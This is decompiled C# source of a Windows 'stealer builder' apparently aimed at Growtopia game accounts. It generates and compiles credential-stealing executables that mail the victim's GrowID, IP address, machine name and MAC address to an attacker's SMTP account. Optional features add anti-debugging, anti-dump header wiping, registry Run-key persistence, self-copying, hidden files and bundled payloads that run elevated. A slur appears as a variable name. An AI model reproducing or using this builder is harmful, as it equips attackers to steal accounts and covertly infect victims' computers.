using System;
using System.CodeDom.Compiler;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.Http;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using Client;
using LightBuilder.Properties;
using MetroFramework;
using MetroFramework.Components;
using MetroFramework.Controls;
using MetroFramework.Forms;
using Microsoft.Win32;

namespace L33TBuilder
{
	// Token: 0x02000004 RID: 4
	public partial class Form1 : MetroForm
	{
		// Token: 0x06000009 RID: 9 RVA: 0x000020CE File Offset: 0x000002CE
		public Form1()
		{
			this.InitializeComponent();
			base.FormBorderStyle = FormBorderStyle.None;
		}

		// Token: 0x0600000A RID: 10 RVA: 0x000020E4 File Offset: 0x000002E4
		private void UpdateAddresses()
		{
			Form1.Adapter adapter = this.AdaptersComboBox.SelectedItem as Form1.Adapter;
			this.CurrentMacTextBox.Text = adapter.RegistryMac;
			this.ActualMacLabel.Text = adapter.Mac;
		}

		// Token: 0x0600000B RID: 11 RVA: 0x00002124 File Offset: 0x00000324
		private void AdaptersComboBox_SelectedIndexChanged(object sender, EventArgs e)
		{
			this.UpdateAddresses();
		}

		// Token: 0x0600000C RID: 12 RVA: 0x0000212C File Offset: 0x0000032C
		private void RandomButton_Click(object sender, EventArgs e)
		{
			this.CurrentMacTextBox.Text = Form1.Adapter.GetNewMac();
		}

		// Token: 0x0600000D RID: 13 RVA: 0x0000213E File Offset: 0x0000033E
		private void UpdateButton_Click(object sender, EventArgs e)
		{
			if (!Form1.Adapter.IsValidMac(this.CurrentMacTextBox.Text, false))
			{
				MessageBox.Show("Entered MAC-address is not valid; will not update.", "Invalid MAC-address specified", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				return;
			}
			this.SetRegistryMac(this.CurrentMacTextBox.Text);
		}

		// Token: 0x0600000E RID: 14 RVA: 0x00002178 File Offset: 0x00000378
		private void ClearButton_Click(object sender, EventArgs e)
		{
			this.SetRegistryMac("");
		}

		// Token: 0x0600000F RID: 15 RVA: 0x00002185 File Offset: 0x00000385
		private void SetRegistryMac(string mac)
		{
			if ((this.AdaptersComboBox.SelectedItem as Form1.Adapter).SetRegistryMac(mac))
			{
				Thread.Sleep(100);
				this.UpdateAddresses();
				MessageBox.Show("Done!", "Success", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
			}
		}

		// Token: 0x06000010 RID: 16 RVA: 0x000021BF File Offset: 0x000003BF
		private void RereadButton_Click(object sender, EventArgs e)
		{
			this.UpdateAddresses();
		}

		// Token: 0x06000011 RID: 17 RVA: 0x000021C7 File Offset: 0x000003C7
		private void CurrentMacTextBox_TextChanged(object sender, EventArgs e)
		{
			this.UpdateButton.Enabled = Form1.Adapter.IsValidMac(this.CurrentMacTextBox.Text, false);
		}

		// Token: 0x06000012 RID: 18 RVA: 0x000021E8 File Offset: 0x000003E8
		public static string encryptString(string plainText, string passPhrase)
		{
			byte[] bytes = Encoding.UTF8.GetBytes(Form1.initVector);
			byte[] bytes2 = Encoding.UTF8.GetBytes(plainText);
			byte[] bytes3 = new PasswordDeriveBytes(passPhrase, null).GetBytes(16);
			ICryptoTransform transform = new RijndaelManaged
			{
				Mode = CipherMode.CBC
			}.CreateEncryptor(bytes3, bytes);
			MemoryStream memoryStream = new MemoryStream();
			CryptoStream cryptoStream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Write);
			cryptoStream.Write(bytes2, 0, bytes2.Length);
			cryptoStream.FlushFinalBlock();
			byte[] inArray = memoryStream.ToArray();
			memoryStream.Close();
			cryptoStream.Close();
			return Convert.ToBase64String(inArray);
		}

		// Token: 0x06000013 RID: 19 RVA: 0x00002274 File Offset: 0x00000474
		public static string genrandomkey()
		{
			int count = Form1.strchange65.Next(30, 80);
			return new string((from strchange67 in Enumerable.Repeat<string>("0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz!@#$%^&*()_+=-", count)
			select strchange67[Form1.strchange65.Next(strchange67.Length)]).ToArray<char>());
		}

		// Token: 0x06000014 RID: 20 RVA: 0x000022CC File Offset: 0x000004CC
		public string ProcessStealer(string code)
		{
			string text = code;
			string text2 = "\"Stealer with AAP bypass by Light Hax ;D\" + Environment.NewLine + \"GrowID: \" + strchange98(strchange111) + Environment.NewLine + \"IP: \" + ipxd + \"PC name: \" + Environment.UserName + \" / \" + Environment.MachineName + Environment.NewLine + \"Mac Address: \" + strchange103";
			string text3 = "                strchange138 = new MailMessage(\"[emailxdreplace]\", \"[emailxdreplace]\", strchange129, strchange130);\r\n                strchange139.Credentials = new NetworkCredential(\"[emailxdreplace]\", \"[passxdreplace]\");";
			if (this.ProtectStr.Checked)
			{
				string newValue = "        public static string jafajwj = \"aqnjrt4g56jn4ws564g154t5sa4e4agbg8n97\";\r\n        private static string initVector = \"r5dm5fgm24mfhfku\";\r\n        private const int keysize = 256;\r\n        public static string Copy(string yweuytgeatawghgtqajwerqujtqw, string passPhrase)\r\n        {\r\n            byte[] initVectorBytes = Encoding.ASCII.GetBytes(initVector);\r\n            byte[] cipherTextBytes = Convert.FromBase64String(yweuytgeatawghgtqajwerqujtqw);\r\n            PasswordDeriveBytes password = new PasswordDeriveBytes(passPhrase, null);\r\n            byte[] keyBytes = password.GetBytes(keysize / 16);\r\n            RijndaelManaged symmetricKey = new RijndaelManaged();\r\n            //symmetricKey.Padding = PaddingMode.None;\r\n            symmetricKey.Mode = CipherMode.CBC;\r\n            ICryptoTransform decryptor = symmetricKey.CreateDecryptor(keyBytes, initVectorBytes);\r\n            MemoryStream memoryStream = new MemoryStream(cipherTextBytes);\r\n            CryptoStream cryptoStream = new CryptoStream(memoryStream, decryptor, CryptoStreamMode.Read);\r\n            byte[] plainTextBytes = new byte[cipherTextBytes.Length];\r\n            int decryptedByteCount = cryptoStream.Read(plainTextBytes, 0, plainTextBytes.Length);\r\n            memoryStream.Close();\r\n            cryptoStream.Close();\r\n            return Encoding.UTF8.GetString(plainTextBytes, 0, decryptedByteCount);\r\n        }";
				text = text.Replace("//strdecmethodrepxdddd", newValue);
				string text4 = Form1.genrandomkey();
				string text5 = Form1.genrandomkey();
				text3 = text3.Replace("\"[emailxdreplace]\"", string.Concat(new string[]
				{
					"Copy(\"",
					Form1.encryptString(this.Emailtxt.Text, text4),
					"\", \"",
					text4,
					"\")"
				})).Replace("\"[passxdreplace]\"", string.Concat(new string[]
				{
					"Copy(\"",
					Form1.encryptString(this.Passwordtxt.Text, text5),
					"\", \"",
					text5,
					"\")"
				}));
			}
			else
			{
				text3 = text3.Replace("[emailxdreplace]", this.Emailtxt.Text).Replace("[passxdreplace]", this.Passwordtxt.Text);
			}
			text = text.Replace("//networkstuffherexd", text3);
			if (this.AntiDebug.Checked)
			{
				string newValue2 = "        [DllImport(\"kernel32.dll\", CharSet = CharSet.Auto, ExactSpelling = true)]\r\n        internal static extern bool IsDebuggerPresent();\r\n        public static void chlkaofkasdogsgifsj()\r\n        {\r\n            if (Debugger.IsAttached || IsDebuggerPresent())\r\n            {\r\n                Environment.Exit(-1);\r\n            }\r\n        }";
				string newValue3 = "            Thread faggot = new Thread(chlkaofkasdogsgifsj);\r\n            faggot.IsBackground = true;\r\n            faggot.Start();";
				text = text.Replace("//debuggerxddddddddd", newValue2);
				text = text.Replace("//debugcallxdddd", newValue3);
			}
			if (this.AntiDump.Checked)
			{
				string newValue4 = "        [DllImport(\"kernel32.dll\", EntryPoint = \"VirtualProtectEx\", SetLastError = true)]\r\n        static extern unsafe bool VirtualProtectEx(IntPtr hProcess, byte* lpAddress, int dwSize, uint flNewProtect, out uint lpflOldProtect);\r\n        [DllImport(\"kernel32.dll\", EntryPoint = \"OpenProcess\", SetLastError = true)]\r\n        public static extern IntPtr OpenProcess(\r\nuint processAccess,\r\nbool bInheritHandle,\r\nint processId\r\n);\r\n        public static unsafe void Initialize()\r\n        {\r\n            uint old;\r\n            Module module = typeof(strchange143).Module;\r\n            IntPtr prafadfa = OpenProcess(0x001F0FFF, false, Process.GetCurrentProcess().Id);\r\n            var bas = (byte*)Marshal.GetHINSTANCE(module);\r\n            byte* ptr = bas + 0x3c;\r\n            byte* ptr2;\r\n            ptr = ptr2 = bas + *(uint*)ptr;\r\n            ptr += 0x6;\r\n            ushort sectNum = *(ushort*)ptr;\r\n            ptr += 14;\r\n            ushort optSize = *(ushort*)ptr;\r\n            ptr = ptr2 = ptr + 0x4 + optSize;\r\n\r\n            byte* @new = stackalloc byte[11];\r\n            if (module.FullyQualifiedName[0] != '<') //Mapped\r\n            {\r\n                //VirtualProtect(ptr - 16, 8, 0x40, out old);\r\n                //*(uint*)(ptr - 12) = 0;\r\n                byte* mdDir = bas + *(uint*)(ptr - 16);\r\n                //*(uint*)(ptr - 16) = 0;\r\n\r\n                if (*(uint*)(ptr - 0x78) != 0)\r\n                {\r\n                    byte* importDir = bas + *(uint*)(ptr - 0x78);\r\n                    byte* oftMod = bas + *(uint*)importDir;\r\n                    byte* modName = bas + *(uint*)(importDir + 12);\r\n                    byte* funcName = bas + *(uint*)oftMod + 2;\r\n                    VirtualProtectEx(prafadfa, modName, 11, 0x40, out old);\r\n\r\n                    *(uint*)@new = 0x6c64746e;\r\n                    *((uint*)@new + 1) = 0x6c642e6c;\r\n                    *((ushort*)@new + 4) = 0x006c;\r\n                    *(@new + 10) = 0;\r\n\r\n                    for (int i = 0; i < 11; i++)\r\n                        *(modName + i) = *(@new + i);\r\n\r\n                    VirtualProtectEx(prafadfa, funcName, 11, 0x40, out old);\r\n\r\n                    *(uint*)@new = 0x6f43744e;\r\n                    *((uint*)@new + 1) = 0x6e69746e;\r\n                    *((ushort*)@new + 4) = 0x6575;\r\n                    *(@new + 10) = 0;\r\n\r\n                    for (int i = 0; i < 11; i++)\r\n                        *(funcName + i) = *(@new + i);\r\n                }\r\n\r\n                for (int i = 0; i < sectNum; i++)\r\n                {\r\n                    VirtualProtectEx(prafadfa, ptr, 8, 0x40, out old);\r\n                    Marshal.Copy(new byte[8], 0, (IntPtr)ptr, 8);\r\n                    ptr += 0x28;\r\n                }\r\n                VirtualProtectEx(prafadfa, mdDir, 0x48, 0x40, out old);\r\n                byte* mdHdr = bas + *(uint*)(mdDir + 8);\r\n                *(uint*)mdDir = 0;\r\n                *((uint*)mdDir + 1) = 0;\r\n                *((uint*)mdDir + 2) = 0;\r\n                *((uint*)mdDir + 3) = 0;\r\n\r\n                VirtualProtectEx(prafadfa, mdHdr, 4, 0x40, out old);\r\n                *(uint*)mdHdr = 0;\r\n                mdHdr += 12;\r\n                mdHdr += *(uint*)mdHdr;\r\n                mdHdr = (byte*)(((ulong)mdHdr + 7) & ~3UL);\r\n                mdHdr += 2;\r\n                ushort numOfStream = *mdHdr;\r\n                mdHdr += 2;\r\n                for (int i = 0; i < numOfStream; i++)\r\n                {\r\n                    VirtualProtectEx(prafadfa, mdHdr, 8, 0x40, out old);\r\n                    //*(uint*)mdHdr = 0;\r\n                    mdHdr += 4;\r\n                    //*(uint*)mdHdr = 0;\r\n                    mdHdr += 4;\r\n                    for (int ii = 0; ii < 8; ii++)\r\n                    {\r\n                        VirtualProtectEx(prafadfa, mdHdr, 4, 0x40, out old);\r\n                        *mdHdr = 0;\r\n                        mdHdr++;\r\n                        if (*mdHdr == 0)\r\n                        {\r\n                            mdHdr += 3;\r\n                            break;\r\n                        }\r\n                        *mdHdr = 0;\r\n                        mdHdr++;\r\n                        if (*mdHdr == 0)\r\n                        {\r\n                            mdHdr += 2;\r\n                            break;\r\n                        }\r\n                        *mdHdr = 0;\r\n                        mdHdr++;\r\n                        if (*mdHdr == 0)\r\n                        {\r\n                            mdHdr += 1;\r\n                            break;\r\n                        }\r\n                        *mdHdr = 0;\r\n                        mdHdr++;\r\n                    }\r\n                }\r\n            }\r\n            else //Flat\r\n            {\r\n                //VirtualProtect(ptr - 16, 8, 0x40, out old);\r\n                //*(uint*)(ptr - 12) = 0;\r\n                uint mdDir = *(uint*)(ptr - 16);\r\n                //*(uint*)(ptr - 16) = 0;\r\n                uint importDir = *(uint*)(ptr - 0x78);\r\n\r\n                var vAdrs = new uint[sectNum];\r\n                var vSizes = new uint[sectNum];\r\n                var rAdrs = new uint[sectNum];\r\n                for (int i = 0; i < sectNum; i++)\r\n                {\r\n                    VirtualProtectEx(prafadfa, ptr, 8, 0x40, out old);\r\n                    Marshal.Copy(new byte[8], 0, (IntPtr)ptr, 8);\r\n                    vAdrs[i] = *(uint*)(ptr + 12);\r\n                    vSizes[i] = *(uint*)(ptr + 8);\r\n                    rAdrs[i] = *(uint*)(ptr + 20);\r\n                    ptr += 0x28;\r\n                }\r\n\r\n\r\n                if (importDir != 0)\r\n                {\r\n                    for (int i = 0; i < sectNum; i++)\r\n                        if (vAdrs[i] <= importDir && importDir < vAdrs[i] + vSizes[i])\r\n                        {\r\n                            importDir = importDir - vAdrs[i] + rAdrs[i];\r\n                            break;\r\n                        }\r\n                    byte* importDirPtr = bas + importDir;\r\n                    uint oftMod = *(uint*)importDirPtr;\r\n                    for (int i = 0; i < sectNum; i++)\r\n                        if (vAdrs[i] <= oftMod && oftMod < vAdrs[i] + vSizes[i])\r\n                        {\r\n                            oftMod = oftMod - vAdrs[i] + rAdrs[i];\r\n                            break;\r\n                        }\r\n                    byte* oftModPtr = bas + oftMod;\r\n                    uint modName = *(uint*)(importDirPtr + 12);\r\n                    for (int i = 0; i < sectNum; i++)\r\n                        if (vAdrs[i] <= modName && modName < vAdrs[i] + vSizes[i])\r\n                        {\r\n                            modName = modName - vAdrs[i] + rAdrs[i];\r\n                            break;\r\n                        }\r\n                    uint funcName = *(uint*)oftModPtr + 2;\r\n                    for (int i = 0; i < sectNum; i++)\r\n                        if (vAdrs[i] <= funcName && funcName < vAdrs[i] + vSizes[i])\r\n                        {\r\n                            funcName = funcName - vAdrs[i] + rAdrs[i];\r\n                            break;\r\n                        }\r\n                    VirtualProtectEx(prafadfa, bas + modName, 11, 0x40, out old);\r\n\r\n                    *(uint*)@new = 0x6c64746e;\r\n                    *((uint*)@new + 1) = 0x6c642e6c;\r\n                    *((ushort*)@new + 4) = 0x006c;\r\n                    *(@new + 10) = 0;\r\n\r\n                    for (int i = 0; i < 11; i++)\r\n                        *(bas + modName + i) = *(@new + i);\r\n\r\n                    VirtualProtectEx(prafadfa, bas + funcName, 11, 0x40, out old);\r\n\r\n                    *(uint*)@new = 0x6f43744e;\r\n                    *((uint*)@new + 1) = 0x6e69746e;\r\n                    *((ushort*)@new + 4) = 0x6575;\r\n                    *(@new + 10) = 0;\r\n\r\n                    for (int i = 0; i < 11; i++)\r\n                        *(bas + funcName + i) = *(@new + i);\r\n                }\r\n\r\n\r\n                for (int i = 0; i < sectNum; i++)\r\n                    if (vAdrs[i] <= mdDir && mdDir < vAdrs[i] + vSizes[i])\r\n                    {\r\n                        mdDir = mdDir - vAdrs[i] + rAdrs[i];\r\n                        break;\r\n                    }\r\n                byte* mdDirPtr = bas + mdDir;\r\n                VirtualProtectEx(prafadfa, mdDirPtr, 0x48, 0x40, out old);\r\n                uint mdHdr = *(uint*)(mdDirPtr + 8);\r\n                for (int i = 0; i < sectNum; i++)\r\n                    if (vAdrs[i] <= mdHdr && mdHdr < vAdrs[i] + vSizes[i])\r\n                    {\r\n                        mdHdr = mdHdr - vAdrs[i] + rAdrs[i];\r\n                        break;\r\n                    }\r\n                *(uint*)mdDirPtr = 0;\r\n                *((uint*)mdDirPtr + 1) = 0;\r\n                *((uint*)mdDirPtr + 2) = 0;\r\n                *((uint*)mdDirPtr + 3) = 0;\r\n\r\n\r\n                byte* mdHdrPtr = bas + mdHdr;\r\n                VirtualProtectEx(prafadfa, mdHdrPtr, 4, 0x40, out old);\r\n                *(uint*)mdHdrPtr = 0;\r\n                mdHdrPtr += 12;\r\n                mdHdrPtr += *(uint*)mdHdrPtr;\r\n                mdHdrPtr = (byte*)(((ulong)mdHdrPtr + 7) & ~3UL);\r\n                mdHdrPtr += 2;\r\n                ushort numOfStream = *mdHdrPtr;\r\n                mdHdrPtr += 2;\r\n                for (int i = 0; i < numOfStream; i++)\r\n                {\r\n                    VirtualProtectEx(prafadfa, mdHdrPtr, 8, 0x40, out old);\r\n                    //*(uint*)mdHdrPtr = 0;\r\n                    mdHdrPtr += 4;\r\n                    //*(uint*)mdHdrPtr = 0;\r\n                    mdHdrPtr += 4;\r\n                    for (int ii = 0; ii < 8; ii++)\r\n                    {\r\n                        VirtualProtectEx(prafadfa, mdHdrPtr, 4, 0x40, out old);\r\n                        *mdHdrPtr = 0;\r\n                        mdHdrPtr++;\r\n                        if (*mdHdrPtr == 0)\r\n                        {\r\n                            mdHdrPtr += 3;\r\n                            break;\r\n                        }\r\n                        *mdHdrPtr = 0;\r\n                        mdHdrPtr++;\r\n                        if (*mdHdrPtr == 0)\r\n                        {\r\n                            mdHdrPtr += 2;\r\n                            break;\r\n                        }\r\n                        *mdHdrPtr = 0;\r\n                        mdHdrPtr++;\r\n                        if (*mdHdrPtr == 0)\r\n                        {\r\n                            mdHdrPtr += 1;\r\n                            break;\r\n                        }\r\n                        *mdHdrPtr = 0;\r\n                        mdHdrPtr++;\r\n                    }\r\n                }\r\n            }\r\n        }";
				text = text.Replace("//antidumpheremethod", newValue4);
				text = text.Replace("//antidumpinit", "Initialize();");
			}
			if (this.RegularStartup.Checked)
			{
				text = text.Replace("//addnormalstartupxdd", "            using (RegistryKey regk = Registry.LocalMachine.OpenSubKey(@\"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\", true))\r\n            {\r\n                try{regk.SetValue(Path.GetFileNameWithoutExtension(Application.ExecutablePath), @\"\"\"\" + Application.ExecutablePath + @\"\"\"\");}catch{}\r\n            }");
			}
			if (this.CopyStealer.Checked)
			{
				text = text.Replace("//copyfilewtfffxd", "            string pathexefdfdaf = Environment.ExpandEnvironmentVariables(\"[EnvironmentVarxd]\") + @\"\\\" + Path.GetFileName(System.Reflection.Assembly.GetEntryAssembly().Location);\r\n            if (System.Reflection.Assembly.GetEntryAssembly().Location != pathexefdfdaf)\r\n            {\r\n                try\r\n                {\r\n                 File.Delete(pathexefdfdaf);\r\n                }\r\n                 catch{}\r\n                File.Copy(System.Reflection.Assembly.GetEntryAssembly().Location, pathexefdfdaf);\r\n                Thread.Sleep(300);\r\n                Process.Start(pathexefdfdaf);\r\n                Thread.Sleep(500);\r\n                Environment.Exit(0);\r\n            }");
			}
			if (this.HideFile.Checked)
			{
				text = text.Replace("//hidefileomglolok", "            try { File.SetAttributes(System.Reflection.Assembly.GetEntryAssembly().Location, File.GetAttributes(System.Reflection.Assembly.GetEntryAssembly().Location) | FileAttributes.Hidden | FileAttributes.System); } catch { }");
			}
			if (this.listView1.Items.Count > 0)
			{
				string text6 = "        static void ThisMethodxd()\r\n        {\r\n            //startuplolp\r\n            string sjnfnos = Environment.ExpandEnvironmentVariables(\"replacexdgggggg36346365\");\r\n            //string gripo = \"bit098\";\r\n\r\n            //hidexdsfng\r\n        }\r\n        public static void extract2idk(string resourceName, string fileName, bool lmao, bool admin)\r\n        {\r\n            using (var resource = Assembly.GetExecutingAssembly().GetManifestResourceStream(resourceName))\r\n            {\r\n                using (var file = new FileStream(fileName, FileMode.Create, FileAccess.Write))\r\n                {\r\n                    resource.CopyTo(file);\r\n                }\r\n            }\r\n            if (lmao == true)\r\n            {\r\n                if (admin == true)\r\n                {\r\n                    ProcessStartInfo prcs3 = new ProcessStartInfo(fileName)\r\n                    {\r\n                        RedirectStandardError = false,\r\n                        RedirectStandardOutput = true,\r\n                        UseShellExecute = false,\r\n                        CreateNoWindow = false,\r\n                        Verb = \"run as\"\r\n                    };\r\n                    Process.Start(prcs3);\r\n                }\r\n                else\r\n                {\r\n                    Process.Start(fileName);\r\n                }\r\n            }\r\n        }";
				int startIndex = text6.IndexOf("bit098\";");
				string text7 = text6;
				text7 = text7.Replace("replacexdgggggg36346365", this.DropTxt2.Text);
				foreach (object obj in this.listView1.Items)
				{
					ListViewItem listViewItem = (ListViewItem)obj;
					if (this.HideFilesBinded.Checked)
					{
						text7 = text7.Insert(startIndex, string.Concat(new string[]
						{
							Environment.NewLine,
							"try{File.SetAttributes(sjnfnos + \"\\\\\" + \"",
							Path.GetFileName(listViewItem.SubItems[0].Text),
							"\", File.GetAttributes(sjnfnos + \"\\\\\" + \"",
							Path.GetFileName(listViewItem.SubItems[0].Text),
							"\") | FileAttributes.Hidden | FileAttributes.System); }catch{}"
						}));
					}
					text7 = text7.Insert(startIndex, string.Concat(new string[]
					{
						Environment.NewLine,
						"extract2idk(\"",
						Path.GetFileName(listViewItem.SubItems[0].Text),
						"\", sjnfnos + \"\\\\\" + \"",
						Path.GetFileName(listViewItem.SubItems[0].Text),
						"\", ",
						listViewItem.SubItems[1].Text,
						", ",
						listViewItem.SubItems[2].Text,
						");"
					}));
					if (this.HideFilesBinded.Checked)
					{
						text7 = text7.Insert(startIndex, Environment.NewLine + "try{File.SetAttributes(sjnfnos + \"\\\\\" + \"" + Path.GetFileName(listViewItem.SubItems[0].Text) + "\", FileAttributes.Normal); }catch{}");
					}
				}
				text = text.Replace("//insertbindmethods", text7);
				text = text.Replace("//callbindmethodxd", "if(System.Reflection.Assembly.GetEntryAssembly().Location != Environment.ExpandEnvironmentVariables(\"[EnvironmentVarxd]\") + @\"\\\" + Path.GetFileName(System.Reflection.Assembly.GetEntryAssembly().Location)){ThisMethodxd();}");
			}
			text = text.Replace("[EnvironmentVarxd]", this.DropPathtxt.Text);
			text = text.Replace("[9rands]", Form1.Get9RND()).Replace("[5rands]", Form1.Get5RND());
			string str = Form1.grab5keys();
			string str2 = Form1.grab9keys();
			text = text.Replace("//changelistgggg5", "string[] listggg5 = { " + str + "};");
			text = text.Replace("//changelistgggg9", "string[] listggg9 = { " + str2 + "};");
			text2 += ";";
			text = text.Replace("[SMTPPORTXD]", this.SMTPPORT.Text).Replace("[SMTPReP]", this.SMTPSERVER.Text).Replace("//messageemailxd", text2);
			return text;
		}

		// Token: 0x06000015 RID: 21 RVA: 0x00002790 File Offset: 0x00000990
		public static string grab5keys()
		{
			string text = "";
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft");
			foreach (string text2 in registryKey.GetSubKeyNames())
			{
				if (Regex.IsMatch(text2, "^[0-9]+$", RegexOptions.Compiled) && text2.Length == 5)
				{
					foreach (string str in registryKey.OpenSubKey(text2).GetValueNames())
					{
						text = text + "\"" + str + "\",";
					}
				}
			}
			return text.TrimEnd(new char[]
			{
				','
			});
		}

		// Token: 0x06000016 RID: 22 RVA: 0x00002834 File Offset: 0x00000A34
		public static string grab9keys()
		{
			string text = "";
			RegistryKey currentUser = Registry.CurrentUser;
			foreach (string text2 in currentUser.GetSubKeyNames())
			{
				if (Regex.IsMatch(text2, "^[0-9]+$", RegexOptions.Compiled) && text2.Length == 9)
				{
					currentUser.OpenSubKey(text2);
					foreach (string str in currentUser.OpenSubKey(text2).GetValueNames())
					{
						text = text + "\"" + str + "\",";
					}
					break;
				}
			}
			return text.TrimEnd(new char[]
			{
				','
			});
		}

		// Token: 0x06000017 RID: 23 RVA: 0x000028DC File Offset: 0x00000ADC
		public static string Get5RND()
		{
			string result;
			try
			{
				foreach (string text in Registry.CurrentUser.OpenSubKey("Software\\Microsoft", true).GetSubKeyNames())
				{
					if (Regex.IsMatch(text, "^[0-9]+$", RegexOptions.Compiled) && text.Length == 5)
					{
						return text;
					}
					if (!Regex.IsMatch(text, "^[0-9]+$", RegexOptions.Compiled))
					{
						int length = text.Length;
					}
				}
				result = "NULL";
			}
			catch
			{
				result = "NULL";
			}
			return result;
		}

		// Token: 0x06000018 RID: 24 RVA: 0x00002968 File Offset: 0x00000B68
		public static string Get9RND()
		{
			string result;
			try
			{
				foreach (string text in Registry.CurrentUser.GetSubKeyNames())
				{
					if (Regex.IsMatch(text, "^[0-9]+$", RegexOptions.Compiled) && text.Length == 9)
					{
						return text;
					}
					if (!Regex.IsMatch(text, "^[0-9]+$", RegexOptions.Compiled))
					{
						int length = text.Length;
					}
				}
				result = "NULL";
			}
			catch
			{
				result = "NULL";
			}
			return result;
		}

		// Token: 0x06000019 RID: 25 RVA: 0x000029E8 File Offset: 0x00000BE8
		public void compile2(string path)
		{
			string text = Resources.Code;
			text = this.ProcessStealer(text);
			List<string> list = new List<string>();
			list.Add(text);
			string contents = "<?xml version=\"1.0\" encoding=\"utf-8\"?>\r\n<assembly manifestVersion=\"1.0\" xmlns=\"urn:schemas-microsoft-com:asm.v1\">\r\n  <assemblyIdentity version=\"1.0.0.0\" name=\"MyApplication.app\"/>\r\n  <trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v2\">\r\n    <security>\r\n      <requestedPrivileges xmlns=\"urn:schemas-microsoft-com:asm.v3\">\r\n        <requestedExecutionLevel level=\"highestAvailable\" uiAccess=\"false\" />\r\n      </requestedPrivileges>\r\n    </security>\r\n  </trustInfo>\r\n\r\n  <compatibility xmlns=\"urn:schemas-microsoft-com:compatibility.v1\">\r\n    <application>\r\n    </application>\r\n  </compatibility>\r\n</assembly>\r\n";
			File.WriteAllText(Application.StartupPath + "\\manifest.manifest", contents);
			CodeDomProvider codeDomProvider = CodeDomProvider.CreateProvider("CSharp");
			CompilerParameters compilerParameters = new CompilerParameters();
			compilerParameters.ReferencedAssemblies.Add("System.Net.dll");
			compilerParameters.ReferencedAssemblies.Add("System.dll");
			compilerParameters.ReferencedAssemblies.Add("System.Windows.Forms.dll");
			compilerParameters.ReferencedAssemblies.Add("System.Drawing.dll");
			compilerParameters.ReferencedAssemblies.Add("System.Management.dll");
			compilerParameters.ReferencedAssemblies.Add("System.IO.dll");
			compilerParameters.ReferencedAssemblies.Add("System.IO.compression.dll");
			compilerParameters.ReferencedAssemblies.Add("System.IO.compression.filesystem.dll");
			compilerParameters.ReferencedAssemblies.Add("System.Core.dll");
			compilerParameters.ReferencedAssemblies.Add("System.Security.dll");
			bool flag = false;
			if (this.listView1.Items.Count > 0)
			{
				foreach (object obj in this.listView1.Items)
				{
					ListViewItem listViewItem = (ListViewItem)obj;
					compilerParameters.EmbeddedResources.Add(listViewItem.SubItems[0].Text ?? "");
					if (listViewItem.SubItems[2].Text.Contains("true"))
					{
						flag = true;
					}
				}
			}
			compilerParameters.GenerateExecutable = true;
			compilerParameters.OutputAssembly = path;
			compilerParameters.GenerateInMemory = false;
			compilerParameters.TreatWarningsAsErrors = false;
			CompilerParameters compilerParameters2 = compilerParameters;
			compilerParameters2.CompilerOptions += "/t:winexe /unsafe /platform:x86";
			if (flag)
			{
				CompilerParameters compilerParameters3 = compilerParameters;
				compilerParameters3.CompilerOptions = compilerParameters3.CompilerOptions + " /win32manifest:\"" + Application.StartupPath + "\\manifest.manifest\"";
			}
			if (!string.IsNullOrEmpty(this.IconPAthxd.Text) || (!string.IsNullOrWhiteSpace(this.IconPAthxd.Text) && this.IconPAthxd.Text.Contains("\\") && this.IconPAthxd.Text.Contains(":") && this.IconPAthxd.Text.Length >= 7))
			{
				if (!this.isvalidFilepath(this.IconPAthxd.Text))
				{
					MessageBox.Show("Path possibly invalid!", "Error!");
					return;
				}
				CompilerParameters compilerParameters4 = compilerParameters;
				compilerParameters4.CompilerOptions = compilerParameters4.CompilerOptions + " /win32icon:\"" + this.IconPAthxd.Text + "\"";
			}
			else if (!string.IsNullOrEmpty(this.IconPAthxd.Text) && !string.IsNullOrWhiteSpace(this.IconPAthxd.Text))
			{
				MessageBox.Show("Path possibly invalid!", "Error!");
				return;
			}
			Thread.Sleep(100);
			CompilerResults compilerResults = codeDomProvider.CompileAssemblyFromSource(compilerParameters, list.ToArray());
			if (compilerResults.Errors.Count > 0)
			{
				try
				{
					File.Delete(Application.StartupPath + "\\manifest.manifest");
				}
				catch
				{
				}
				using (IEnumerator enumerator = compilerResults.Errors.GetEnumerator())
				{
					while (enumerator.MoveNext())
					{
						object obj2 = enumerator.Current;
						MessageBox.Show(((CompilerError)obj2).ToString());
					}
					return;
				}
			}
			try
			{
				File.Delete(Application.StartupPath + "\\manifest.manifest");
			}
			catch
			{
			}
			MessageBox.Show("Done building stealer!");
		}

		// Token: 0x0600001A RID: 26 RVA: 0x00002DBC File Offset: 0x00000FBC
		private void BrowseIcon_Click(object sender, EventArgs e)
		{
			OpenFileDialog openFileDialog = new OpenFileDialog();
			openFileDialog.Filter = "Icon files (*.ico)|*.ico";
			if (openFileDialog.ShowDialog() == DialogResult.OK)
			{
				this.IconPAthxd.Text = openFileDialog.FileName;
			}
		}

		// Token: 0x17000005 RID: 5
		// (get) Token: 0x0600001B RID: 27 RVA: 0x00002DF4 File Offset: 0x00000FF4
		// (set) Token: 0x0600001C RID: 28 RVA: 0x00002DFB File Offset: 0x00000FFB
		public static int ghp { get; set; }

		// Token: 0x0600001D RID: 29 RVA: 0x00002E04 File Offset: 0x00001004
		public void timer_Tick(object sender, EventArgs e)
		{
			if (Form1.ghp == 240)
			{
				Form1.ghp = 0;
				return;
			}
			Form1.ghp++;
			this.label8.ForeColor = ColorTranslator.FromWin32(Form1.ColorHLSToRGB(Form1.ghp, 100, 150));
		}

		// Token: 0x0600001E RID: 30
		[DllImport("shlwapi.dll")]
		public static extern int ColorHLSToRGB(int H, int L, int S);

		// Token: 0x0600001F RID: 31 RVA: 0x00002E54 File Offset: 0x00001054
		private void Form1_Load(object sender, EventArgs e)
		{
			System.Windows.Forms.Timer timer = new System.Windows.Forms.Timer();
			timer.Interval = 1;
			timer.Tick += this.timer_Tick;
			timer.Enabled = true;
			timer.Start();
